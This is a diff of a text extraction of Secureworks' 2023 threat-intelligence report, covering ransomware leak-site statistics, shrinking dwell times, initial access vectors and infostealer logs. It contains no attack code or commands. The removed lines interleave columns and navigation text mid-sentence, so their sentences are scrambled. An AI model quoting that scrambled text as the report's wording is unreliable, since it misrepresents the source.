@@ -1,79 +1,1790 @@
-State of the ThreatAY EA RI NR EVIE W7 T HE DITIO NTable of 
-Contents0304073643666970Letter From Our Vice President, Threat ResearchExecutive Summary and Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur When Infection Chains Are Forced to EvolveState\-Sponsored Threat ActivityThreat Actor Use of Artificial IntelligenceConclusionAppendix22023 State of the Threat: A Year in Review01A Letter From Our Vice 
-President, Threat Research01Letter From Our VPExecutive Summaryand Key Findings0203The Business of CybercrimeIs Boomtime Back?The war in Ukraine continues to dominate the headlines, both inplatform. We combine it with insights from engagements carriedterms of kinetic military action and of hostile pro\-Russia cyberout by the Secureworks Incident Response team, dynamic threatactivity. It is not surprising that Russian state\-sponsored threatactor emulation activities, extensive monitoring of the Dark WebInnovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligencegroups persist in conducting attacks against targets in Ukraine and inand underground forums, coupled with proactive research intocountries that have vocally supported Ukraine in the conflict.cyberattacks to create a unique view of the threat landscape. AllFor the first few months after Russia's invasion of Ukraine oncircle that further combines with the wealth of human expertise wethese data points then feed back into Taegis, creating a virtuousFebruary 24, 2022, it looked as if an unexpected but welcome victimoffer to help keep our customers safe.of the war might be the cybercrime ecosystem, as the number ofsuccessful ransomware attacks dropped.This report distills our findings to share with you, drawing andEighteen months on, that optimism appears short lived.customers over the period this report covers. It specifically focusesbuilding on the specialist threat intelligence we have published to ourRansomware attack numbers have rapidly returned to and thenexceeded normal levels over the period of this report. Some well\-on how threat actor behavior has evolved over the past twelvemonths, both in terms of tooling and tactics.07Conclusionnew groups are joining the fray too. Other threat actors haveand useful part of your security journey.known ransomware operator names remain highly active, andWe hope the information presented here proves both an interesting08AppendixKorean attackers focused on cryptocurrency theft.also continued to concern our customers, from business emailcompromise attackers to Chinese cyberespionage groups, to NorthSincerely,The Secureworks Counter Threat Unit (CTU) gathers the dataobtained from the trillions of events processed by our Taegis XDRDon Smith
+AY EA RI NR EVIEW
+State of the Threat
+7 T HE DITION
+2
+2023 State of the Threat: A Year in Review
+Table of 
+Contents
+Letter From Our Vice President, Threat Research
+Executive Summary and Key Findings
+The Business of CybercrimeIs Boomtime Back?
+Innovations in TTPs Occur When Infection Chains Are Forced to Evolve
+State\-Sponsored Threat Activity
+Threat Actor Use of Artificial Intelligence
+Conclusion
+Appendix
+03
+04
+07
+36
+43
+66
+69
+70
+The war in Ukraine continues to dominate the headlines, both in 
+terms of kinetic military action and of hostile pro\-Russia cyber 
+activity. It is not surprising that Russian state\-sponsored threat 
+groups persist in conducting attacks against targets in Ukraine and in 
+countries that have vocally supported Ukraine in the conflict.
+For the first few months after Russia's invasion of Ukraine on 
+February 24, 2022, it looked as if an unexpected but welcome victim 
+of the war might be the cybercrime ecosystem, as the number of 
+successful ransomware attacks dropped. 
+Eighteen months on, that optimism appears short lived. 
+Ransomware attack numbers have rapidly returned to and then 
+exceeded normal levels over the period of this report. Some well\-
+known ransomware operator names remain highly active, and 
+new groups are joining the fray too. Other threat actors have 
+also continued to concern our customers, from business email 
+compromise attackers to Chinese cyberespionage groups, to North 
+Korean attackers focused on cryptocurrency theft.
+The Secureworks Counter Threat Unit (CTU) gathers the data 
+obtained from the trillions of events processed by our Taegis XDR 
+platform. We combine it with insights from engagements carried 
+out by the Secureworks Incident Response team, dynamic threat 
+actor emulation activities, extensive monitoring of the Dark Web 
+and underground forums, coupled with proactive research into 
+cyberattacks to create a unique view of the threat landscape. All 
+these data points then feed back into Taegis, creating a virtuous 
+circle that further combines with the wealth of human expertise we 
+offer to help keep our customers safe.
+This report distills our findings to share with you, drawing and 
+building on the specialist threat intelligence we have published to our 
+customers over the period this report covers. It specifically focuses 
+on how threat actor behavior has evolved over the past twelve 
+months, both in terms of tooling and tactics. 
+We hope the information presented here proves both an interesting 
+and useful part of your security journey.
+Sincerely,
+3
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+01
+A Letter From Our Vice 
+President, Threat Research
+Don Smith
 Vice President, Threat Research
-Secureworks2023 State of the Threat: A Year in Review301Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix02Executive 
+Secureworks
+4
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Over the past year, both cybercriminal and state\-sponsored threat 
+actors have maintained high levels of activity, meaning that the 
+threat level to businesses remains as elevated as ever. The range of 
+threats remains broad, from the temporary nuisance of hacktivist 
+denial of service attacks to wiper attacks or IP theft and other 
+types of cyberespionage, from business email compromise to data 
+exfiltration attacks or business\-threatening ransomware attacks. 
+Precursor cyber activity continues at scale, delivering the malware 
+that makes many of these cyberattacks, particularly ransomware 
+attacks, easier and faster to carry out.
+Amidst all this, Secureworks Counter Threat Unit (CTU) 
+researchers continue to track these threats and use their knowledge 
+and expertise to develop insights into this activity. These insights 
+feed into published threat intelligence and provide the indicators 
+and technical content that allows us to create countermeasures that 
+provide protection for Secureworks' customers. 
+This report synthesizes and presents our findings for the period July 
+2022 to June 2023\.
+02
+Executive 
 Summary and 
-Key FindingsOver the past year, both cybercriminal and state\-sponsored threatactors have maintained high levels of activity, meaning that thethreat level to businesses remains as elevated as ever. The range ofthreats remains broad, from the temporary nuisance of hacktivistdenial of service attacks to wiper attacks or IP theft and othertypes of cyberespionage, from business email compromise to dataexfiltration attacks or business\-threatening ransomware attacks.Precursor cyber activity continues at scale, delivering the malwarethat makes many of these cyberattacks, particularly ransomwareattacks, easier and faster to carry out.Amidst all this, Secureworks Counter Threat Unit (CTU)researchers continue to track these threats and use their knowledgeand expertise to develop insights into this activity. These insightsfeed into published threat intelligence and provide the indicatorsand technical content that allows us to create countermeasures thatprovide protection for Secureworks' customers.This report synthesizes and presents our findings for the period July2022 to June 2023\.2023 State of the Threat: A Year in Review401Ransomware continues to be the primary threatfacing organizations, because of the scope ofdisruption it can cause and its prevalence. Attack03Infostealer activity has also increased, associated inlarge part with use by ransomware affiliates. Stolencredentials now vie with scan\-and\-exploit as some ofnumbers returned to and then exceeded historicalthe most significant precursors of ransomware attacks.norms, after last year's brief slowdown following theOn a single day on one underground marketplace, asinvasion of Ukraine. Average dwell times betweenmany as seven million infostealer logs were availableinitial access and ransomware payload delivery havefor sale, well over twice as many as on the samedropped significantly to a median figure of justday last year. The case for organizations to monitor24 hours. 2023 may be the most prolific year forunderground forums for stolen data is clear.ransomware attacks to date.02Supply chain attacks on and through suppliersprovide threat actors with maximum impact foreffort expended. Threat actors as diverse as North04Drive\-by downloads are becoming increasinglypopular as a malware delivery method and overthe past year have surged in use as an initialKorean state\-sponsored groups and ransomwareaccess vector for ransomware. Two major strainsoperators have conducted notable supply chainof malware delivered this way are Gootloader andattacks over the past year, leveraging initial victimsSocGholish, often via compromised websites.to gain access to their customers.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review501Letter From Our VP05Microsoft's disabling by default of macrosin documents from the internet has forcedthreat actors to innovate in how they deliver07State\-sponsored threat activity remains drivenby political imperatives. Russia's primary focus isthe war in Ukraine, North Korea's is currency theft,0203Executive Summaryand Key Findingsmalware. Use of malicious Microsoft OneNoteIran's is suppression of opposition, and China's isfiles and container file types such as ISO grew tocyberespionage. However, regional focuses are, inThe Business of CybercrimeIs Boomtime Back?compensate during the year.some cases, starting to shift, particularly on the partof China, which is closely monitoring the impact ofthe war on Ukraine on other European nations.Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix06Regular and timely patching remains as essentialas ever in preventing threat actors fromcompromising networks. Both state\-sponsored08Artificial intelligence (AI) is a supporting tool toexisting threat actors, rather than a new class of threat.To date, phishing lures and Telegram bots remain thethreat groups and cybercriminals make wide usemajor tangible evidence of use of AI by threat actors.of scan\-and\-exploit to commence their attacks,However, the level of interest that threat actors aremaking exploited vulnerabilities one of the mostshowing suggests that they may soon develop morefrequently observed initial access vectors.complex and dangerous applications.2023 State of the Threat: A Year in Review603The Business of Cybercrime 
-Is Boomtime Back?01Letter From Our VPExecutive Summaryand Key Findings0203The Business of CybercrimeIs Boomtime Back?Over the past year, the number of victims named on ransomwareThe last four months have proved the most fertile in terms of victimleak sites returned to normal levels (after the brief dip in early 20221\)numbers since name\-and\-shame emerged.and then continued to grow to reach unprecedented heights.Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 1\. Ransomware name\-and\-shame leak site victim listings2020 to 2023\. (Source: Secureworks)2023 State of the Threat: A Year in Review70100200300400500600JanuaryFebruary2020\-212021\-222022\-23MarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecemberIt is tempting to conclude that business is booming, although leak sites only list victims who have notpaid the ransom, so an entirely accurate picture is not possible. However, we should not forget thatspikes of anomalous activity on the part of a few highly impactful groups may to an extent be skewingthe figures, as shown in figure 2\.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 2\. Victim count by scheme per month. (Source: Secureworks)2023 State of the Threat: A Year in Review8300050257510015012517520025022527571228122912210122111221212211232123312341235123612371238123LockBitLorenzLVCL0PMalasLocker0mega8BASEAkiraAvosLockerBianLianBl00dyBlack BastaBLACK SUITBlackByteBlackCatALPHVCactusCipherLockerCloakCrossLockCryptNetCryptOnCubaCyclopsD0N\#T (Donut Leaks)DAIXINDarkPowerDarkRaceDonutDunghill LeakEnduranceEverestHiveIceFireINC RansomIndustrial SpyKarakurtRoyalSiegedSecSnatchMetaencryptorSodinokibi (REvil)MalloxMedusaMedusa LockerMoney MessageMONTINoEscapeNokoyawaOnyxPLAYProject RelicQilinQuantumRA GROUPRagnar\_LockerRancozRansomedRansomedVCRansomEXXRansomHouseRedAlertREvilRhysidaSpartaSTORMOUSTrigonaUnsafeVendettaVice SocietyVSOP (Onyx)Yanluowangz6wkg01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Name\-and\-Shame Sites Reveal 
+Key Findings
+5
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Ransomware continues to be the primary threat 
+facing organizations, because of the scope of 
+disruption it can cause and its prevalence. Attack 
+numbers returned to and then exceeded historical 
+norms, after last year's brief slowdown following the 
+invasion of Ukraine. Average dwell times between 
+initial access and ransomware payload delivery have 
+dropped significantly to a median figure of just 
+24 hours. 2023 may be the most prolific year for 
+ransomware attacks to date.
+Drive\-by downloads are becoming increasingly 
+popular as a malware delivery method and over 
+the past year have surged in use as an initial 
+access vector for ransomware. Two major strains 
+of malware delivered this way are Gootloader and 
+SocGholish, often via compromised websites.
+01
+04
+Supply chain attacks on and through suppliers 
+provide threat actors with maximum impact for 
+effort expended. Threat actors as diverse as North 
+Korean state\-sponsored groups and ransomware 
+operators have conducted notable supply chain 
+attacks over the past year, leveraging initial victims 
+to gain access to their customers.
+02
+Infostealer activity has also increased, associated in 
+large part with use by ransomware affiliates. Stolen 
+credentials now vie with scan\-and\-exploit as some of 
+the most significant precursors of ransomware attacks. 
+On a single day on one underground marketplace, as 
+many as seven million infostealer logs were available 
+for sale, well over twice as many as on the same 
+day last year. The case for organizations to monitor 
+underground forums for stolen data is clear.
+03
+6
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Microsoft's disabling by default of macros 
+in documents from the internet has forced 
+threat actors to innovate in how they deliver 
+malware. Use of malicious Microsoft OneNote 
+files and container file types such as ISO grew to 
+compensate during the year.
+Artificial intelligence (AI) is a supporting tool to 
+existing threat actors, rather than a new class of threat. 
+To date, phishing lures and Telegram bots remain the 
+major tangible evidence of use of AI by threat actors. 
+However, the level of interest that threat actors are 
+showing suggests that they may soon develop more 
+complex and dangerous applications.
+05
+08
+Regular and timely patching remains as essential 
+as ever in preventing threat actors from 
+compromising networks. Both state\-sponsored 
+threat groups and cybercriminals make wide use 
+of scan\-and\-exploit to commence their attacks, 
+making exploited vulnerabilities one of the most 
+frequently observed initial access vectors.
+06
+State\-sponsored threat activity remains driven 
+by political imperatives. Russia's primary focus is 
+the war in Ukraine, North Korea's is currency theft, 
+Iran's is suppression of opposition, and China's is 
+cyberespionage. However, regional focuses are, in 
+some cases, starting to shift, particularly on the part 
+of China, which is closely monitoring the impact of 
+the war on Ukraine on other European nations.
+07
+7
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Over the past year, the number of victims named on ransomware 
+leak sites returned to normal levels (after the brief dip in early 20221\) 
+and then continued to grow to reach unprecedented heights.
+The last four months have proved the most fertile in terms of victim 
+numbers since name\-and\-shame emerged. 
+03
+The Business of Cybercrime 
+Is Boomtime Back?
+Figure 1\. Ransomware name\-and\-shame leak site victim listings2020 to 2023\. (Source: Secureworks)
+0
+100
+200
+300
+400
+500
+600
+January
+February
+2020\-21
+2021\-22
+2022\-23
+March
+April
+May
+June
+July
+August
+September
+October
+November
+December
+8
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+300
+0
+50
+25
+75
+100
+150
+125
+175
+200
+250
+225
+275
+7122
+8122
+9122
+10122
+11122
+12122
+1123
+2123
+3123
+4123
+5123
+6123
+7123
+8123
+LockBit
+Lorenz
+LV
+CL0P
+MalasLocker
+0mega
+8BASE
+Akira
+AvosLocker
+BianLian
+Bl00dy
+Black Basta
+BLACK SUIT
+BlackByte
+BlackCatALPHV
+Cactus
+CipherLocker
+Cloak
+CrossLock
+CryptNet
+CryptOn
+Cuba
+Cyclops
+D0N\#T (Donut Leaks)
+DAIXIN
+DarkPower
+DarkRace
+Donut
+Dunghill Leak
+Endurance
+Everest
+Hive
+IceFire
+INC Ransom
+Industrial Spy
+Karakurt
+Royal
+SiegedSec
+Snatch
+Metaencryptor
+Sodinokibi (REvil)
+Mallox
+Medusa
+Medusa Locker
+Money Message
+MONTI
+NoEscape
+Nokoyawa
+Onyx
+PLAY
+Project Relic
+Qilin
+Quantum
+RA GROUP
+Ragnar\_Locker
+Rancoz
+Ransomed
+RansomedVC
+RansomEXX
+RansomHouse
+RedAlert
+REvil
+Rhysida
+Sparta
+STORMOUS
+Trigona
+Unsafe
+Vendetta
+Vice Society
+VSOP (Onyx)
+Yanluowang
+z6wkg
+It is tempting to conclude that business is booming, although leak sites only list victims who have not 
+paid the ransom, so an entirely accurate picture is not possible. However, we should not forget that 
+spikes of anomalous activity on the part of a few highly impactful groups may to an extent be skewing 
+the figures, as shown in figure 2\.
+Figure 2\. Victim count by scheme per month. (Source: Secureworks)
+9
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+0
+1000
+2000
+3000
+5000
+6000
+7000
+4000
+3698
+5088
+6342
+2020\-21
+2021\-22
+2022\-23
+Name\-and\-Shame Sites Reveal 
 the Most Active Ransomware 
-GroupsAt current rates of victim naming, 2023 is on course to be the mostprolific year since name\-and\-shame attacks began in 2019\. It is likelythat the 10,000th victim name will be posted to leak sites by latesummer 2023Innovations in TTPs Occur04When Infection Chains AreHowever, one\-off mass exploitations of specific vulnerabilitiesexplain why March (Fortra GoAnywhere, exploited by Clop operatorGOLD TAHOE2\), May (Zimbra mail server, exploited by MalasLocker)Forced to Evolveand June 2023 (MOVEit Transfer, exploited by GOLD TAHOE) sawthe highest ever monthly number of victims named.0506State\-SponsoredThreat ActivityThe same threat groups continued to dominate in 2023GOLDMYSTIC's LockBit again remains the head of the pack but GOLDBLAZER's BlackCatALPHV, Clop, GOLD SOUVENIR's Royal,BianLian, PLAY and GOLD REBELLION's Black Basta all feature in theThreat Actor Use ofArtificial Intelligenceten most active groups.07Conclusion08AppendixLockBit operator GOLD MYSTIC and its broad and loosely managedpool of affiliates continue to deploy LockBit ransomware prolifically.Once again in 202223, it tops the ratings for most active group, thistime with nearly three times the number of victims of the next mostactive group, ALPHV(BlackCat), operated by GOLD BLAZER.Figure 3\. Name\-and\-shame victims listed per year July\-June. (Source: 
-Secureworks)\* The 10,000th name\-and\-shame ransomware victim name 
-was posted to the BlackCatALPHV leak site in mid\-August.2023 State of the Threat: A Year in Review9010002000300050006000700040003698508863422020\-212021\-222022\-2301Letter From Our VPHowever, new schemes have also posted numerous victims:MalasLocker attacks, targeting Zimbra servers from the end ofMalasLocker, 8BASE and Akira all emerged only in May 2023\. 8BASEMarch 20233 and listed on their leak site in May, accounted for at0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendixlisted nearly 40 victims on its leak site during June 2023, onlyleast 171 victims. This provides just one illustration of how valuableslightly fewer than LockBit. Analysis indicates it posted a dumpscan\-and\-exploit (where threat actors use search engines to identifyof victims going as far back as mid\-2022 all at the same time.vulnerable systems) can be as a tactic for ransomware groups.Figure 4\. The 20 most active name\-and\-shame ransomware groups by victims listed between July 2022 and June 2023\. (Source: Secureworks)2023 State of the Threat: A Year in Review10020040060080010001200BlackCatALPHVCL0PBianLianRoyalBlack BastaMalasLockerPLAY8BASEKarakurtVice SocietyHiveMedusaAkiraSnatchSTORMOUSBlackByteRansomHouseLVAvosLockerLockBit984355207202197195171143108909078655655514645433001Letter From Our VPAssessing the Size of the
-Ransomware Problem0203Executive Summaryand Key FindingsAccurately assessing the scale of the ransomware problem ischallenging. Leak sites only touch on a fraction of the problem andnot all ransomware groups operate leak sites. New ransomwarevariants launch regularly. Without a leak site, it is very difficult todisclosure.The Business of Cybercrimejudge how active they are.Is Boomtime Back?The primary purpose of leak sites is to encourage currentlyrecalcitrant victims to pay. Therefore, they only show the namesof victims who are yet to pay a ransom. As such, they cannot beconsidered an accurate record of any specific group's activity.Nor are they an indication of the overall impact of ransomware.Historic data from ransomware group takedowns or collapsesindicate that leak sites only reveal a small percentage of overallattacks. For example, Hive's leak site listed 150 organizations, likelyaccounting for around 10 percent of their overall victim count of1,500\. Avaddon listed just 180 victims, a small fraction of the nearly3,000 decryption keys the group released when it shuttered theoperation. It is difficult to assess how representative theseexamples are.Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixTo extrapolate, we would need to know how successful each group'sleak site is and what the likelihood of payment by a victim once theyhave been named is. It may not be outlandish to assume that thevast majority of successful ransomware operations occur withoutthe victim's name ever reaching the leak sitethat is where theincentive to pay lies, with the victim motivated to prevent publicLeak sites generally do not reveal whether ransomware was deployed.And we can't draw conclusions about how effective or impactfula ransomware deployment was, and whether the victim did notpay because the impact was low, or because the data stolen wasinconsequential.Name\-and\-shame statistics are useful for some things. They showhow particular variants emerge onto the scene and how theygrow and shrink in usage. But how reliable are they as indicators ofimpact? Without knowing how many victims pay the ransom, wecan't determine how successful any particularly variant is in terms ofpayment to victim ratio. Leak site data should therefore be used withcaution. In aggregate though it is clear from the continued activitythat ransomware and data\-theft extortion remain a viable criminalbusiness model and a substantial threat to businesses.2023 State of the Threat: A Year in Review1101Letter From Our VPDwell Times Are Dropping for 
-Ransomware Attacks0203Executive Summaryand Key FindingsDespite the increasing threat posed by ransomware attacks, inmany cases early detection and response thwarts attackers fromThe Business of CybercrimeIs Boomtime Back?progressing to ransomware deployment. Because of this, our incidentresponders frequently discover ransomware precursor activitywithout evidence of damaging system encryption events.However, there have been some interesting trends over the pastyear in those attacks where ransomware is deployed. Most notably,24 hoursAverage (median) dwell 
-time for ransomware actorsInnovations in TTPs Occur04When Infection Chains AreForced to Evolvethe dwell timethe time between gaining access to a network andNotably, the median dwell time in ransomware engagementsexecuting the ransomwarehas significantly reduced compared todropped to just under 24 hours from 4\.5 days in the previous yearprevious years.and 5\.5 days in the year before that.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixIn just over ten percent of cases, we saw ransomwaredeployed within five hours of initial access.Nearly two\-thirds of attacks were carried out inside onesingle day, nearly four fifths within one week.In around a fifth of attacks, the threat actor sat onImportantly, the incident response engagements that providedthe data used to make this calculation featured a broad range of18 different ransomware variants. This means that the data wasnot skewed by a prevalence of variants that are known typically tobe deployed very quickly, such as Phobos ransomware. The dwelltimes in engagements where exfiltration of data was observedthe network for longer than a week before deployingwere generally longer, but this is not universally true; in someransomware.Of those, three\-quarters continued to sit on the networkfor over a month.engagements involving Black Basta, Hive, and AvosLockeralldouble extortion ransomware schemeswe observed dataexfiltration and ransomware deployment taking place more quicklythan the median dwell time of 24 hours.2023 State of the Threat: A Year in Review1201Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial IntelligenceSo why are threat actors executing their ransomware attacksThis absolutely does not imply that ransomware can now be ignoredso much more quickly? CTU researchers have observed thatas a threat. Even a limited distribution on a victim's network can beransomware intrusions have become less complex. Threat actorshighly damaging. Hitting a single server in a production environment,are not conducting the same operations more quickly. Instead, theyfor example, might be enough to take business operations offline forare conducting simpler operations. Devastating enterprise\-wideenough time to cause significant financial impact. And ransomwareencryption events, which are more difficult to execute and takeoperators and their affiliates are aware of this. The increased take\-uplonger to carry out, are now rarer than in previous years.of virtualized environments, now often crucial to many companies'One driver for this is likely the need to reduce dwell time to lowerransomware schemes now have Linux\-compatible variants, createdthe chance of detection. The cybersecurity industry is undoubtedlyto target VMware ESXi hosts. Threat actors have an incentive togetting better at detecting the activity that has historically precededspend minimal time on a likely\-monitored Windows system beforeransomware, such as the use of offensive security toolkits like Cobaltmoving to encrypt hundreds of virtual disks on a single VMware ESXiIT infrastructures, makes them a viable target. More and moreStrike. This may be a factor in forcing ransomware operators to workhost.more quickly.However, it is also likely that the threat actors now deployingincident involving the financially motivated GOLD TOMAHAWKransomware are just lower skilled than previous operators. Thethreat group (also known as Karakurt), Secureworks incidentintroduction of the RaaS model lowered the bar to entry, introducingresponders identified 29 hosts and 10 user accounts compromisedplaybooks for affiliates to use, and allowed it to scale significantly asby the threat actor. Over 300GB of compressed data was exfiltratedDwell times can vary considerably case by case. In July 2022, in ana result.from two of these hosts. The attacker had remained on the networkfor as long as six weeks before incident responders were engaged,Arguably, this represents a commodification of the ransomwarenavigating across multiple hosts in different countries possibly tolandscape, with scheme operators reducing the cost of operationslocate data to steal. The unusually long dwell time included a three\-in order to increase volume. This can be seen in the sheer numberweek hiatus from malicious activity.07Conclusionof victims named on name\-and\-shame leak sites. But it is also08Appendixreflected in the quality of ransomware operations. This mightIn contrast, in April 2023, Secureworks incident respondersprovide one reason why fewer victims are reported4 to be payinginvestigated an incident where an organization that did not useransoms (although such reports may not give a full picture, givenSecureworks managed services experienced an intrusion where,the fracturing of the ransomware landscape and the increasingwithin a single 24\-hour period, two different ransomware variants,difficulties in reliably identifying cryptocurrency wallets).Buhti and AvosLocker, were deployed.2023 State of the Threat: A Year in Review1301Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to EvolveThe Top Initial Access Vectors
-for RansomwareScan\-and\-exploit and stolen credentials were the two largest initialaccess vectors used by threat actors in the ransomware attacksSecureworks investigated, each accounting for approximately 32percent of intrusions. These figures are consistent with the topIAVs for all incident response engagements over the same periodbut represent a change relative to ransomware engagements in theprevious twelve months. This is the period covered in last year's Stateof the Threat report, when scan\-and\-exploit at 52 percent accountedRansomware Initial Access 
-VectorsThe three largest initial access vectors (IAVs) observedduring ransomware engagements where customersengaged Secureworks incident responders were:Scan\-and\-exploit32 percentStolen credentials32 percentfor many more ransomware intrusions than the next nearest IAV,Commodity malware delivered viastolen credentials, at 39 percent.phishing emails14 percentState\-SponsoredThreat ActivitySecureworks incident responders also investigated several intrusionswhere threat actors used the Qakbot malware to deliver CobaltStrike, which then led to Black Basta ransomware deployment. Theseincidents were notable due to the speed of the operations: again,data exfiltration and ransomware deployment occurred within 24Threat Actor Use ofArtificial Intelligencehours of initial access.0506Each of these IAVs can either be prevented or detectedat an early stage before ransomware is deployed, usinga combination of prompt and regular patching, multi\-factor authentication, and comprehensive implementingof monitoring solutions.07Conclusion08Appendix2023 State of the Threat: A Year in Review1401Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixThe most likely enabler of the rise in the use of stolen credentialsThreat actors use these stolen credentials to gain unauthorizedas an IAV is the explosion in infostealer activity. Infostealers areaccess to enterprise networks via remote access services such asa type of malware that can pilfer sensitive information such asvirtual private networks (VPNs) and Microsoft Office Web Accesslogin credentials, session cookies and tokens, financial details, and(OWA). This unauthorized access can form an early stage in thepersonal data from compromised computers and networks. Onceexfiltration of sensitive data or the deployment of ransomware. Asinstalled via methods such as phishing attacks, infected websites,a result, infostealers are a significant type of intrusion precursorand malicious software downloads, they can execute and exit verymalware and a contributory factor to attacks that often happensquickly, sometimes in less than a minute of total runtime. The dataoutside protective corporate controls.is then packaged and sold as logs. Each log contains data taken bythe infostealer from a compromised user machine.loglocal application
-datadocumentssystem
-informationnetwork
-informationsoftware
-informationweb browser
-datacrypto walletsVPN datacredentialsvisited domainscookiestokensFigure 5\. What's in a log? (Source: Secureworks)2023 State of the Threat: A Year in Review1501Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Opening the Valves on the 
+Groups 
+At current rates of victim naming, 2023 is on course to be the most 
+prolific year since name\-and\-shame attacks began in 2019\. It is likely 
+that the 10,000th victim name will be posted to leak sites by late 
+summer 2023
+However, one\-off mass exploitations of specific vulnerabilities 
+explain why March (Fortra GoAnywhere, exploited by Clop operator 
+GOLD TAHOE2\), May (Zimbra mail server, exploited by MalasLocker) 
+and June 2023 (MOVEit Transfer, exploited by GOLD TAHOE) saw 
+the highest ever monthly number of victims named.
+The same threat groups continued to dominate in 2023GOLD 
+MYSTIC's LockBit again remains the head of the pack but GOLD 
+BLAZER's BlackCatALPHV, Clop, GOLD SOUVENIR's Royal, 
+BianLian, PLAY and GOLD REBELLION's Black Basta all feature in the 
+ten most active groups. 
+LockBit operator GOLD MYSTIC and its broad and loosely managed 
+pool of affiliates continue to deploy LockBit ransomware prolifically. 
+Once again in 202223, it tops the ratings for most active group, this 
+time with nearly three times the number of victims of the next most 
+active group, ALPHV(BlackCat), operated by GOLD BLAZER.
+Figure 3\. Name\-and\-shame victims listed per year July\-June. (Source: 
+Secureworks)
+\* The 10,000th name\-and\-shame ransomware victim name 
+was posted to the BlackCatALPHV leak site in mid\-August.
+10
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+However, new schemes have also posted numerous victims: 
